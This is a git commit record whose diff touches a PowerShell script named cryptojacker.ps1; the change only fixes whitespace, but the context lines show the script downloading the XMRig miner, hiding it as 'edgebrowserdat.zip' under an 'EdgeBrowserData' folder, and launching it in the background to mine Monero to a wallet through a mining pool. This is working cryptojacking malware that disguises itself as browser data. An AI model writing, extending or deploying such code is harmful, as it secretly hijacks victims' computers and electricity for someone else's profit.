65e9d3a312fcf8ea778d52de2b0de1654bf3f1b8
Shmilt <askiloseberg@outlook.com>
2025-08-07 00:27:42 +0200

    Update cryptojacker.ps1

--- cryptojacker.ps1
+++ cryptojacker.ps1
@@ -11,5 +11,5 @@ switch ($env:PROCESSOR_ARCHITECTURE)
     "ARM64" { (New-Object System.Net.WebClient).DownloadFile("https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-arm64.zip", "edgebrowserdat.zip") } 
 }
 Move-Item -Path "edgebrowserdat.zip" -Destination "C:\Temp\EdgeBrowserData\" -Force
-Expand-Archive -Path "C:\Temp\EdgeBrowserData\edgebrowserdat.zip"  -DestinationPath "C:\Temp\EdgeBrowserData\" -Force
+Expand-Archive -Path "C:\Temp\EdgeBrowserData\edgebrowserdat.zip" -DestinationPath "C:\Temp\EdgeBrowserData\" -Force
 Start-Process -FilePath "C:\Temp\EdgeBrowserData\xmrig-6.24.0\xmrig.exe" -ArgumentList "--url gulf.moneroocean.stream:10128 --user $XMR_ADDRESS --pass x --coin monero --cpu-priority 1 --threads 2 --background" 
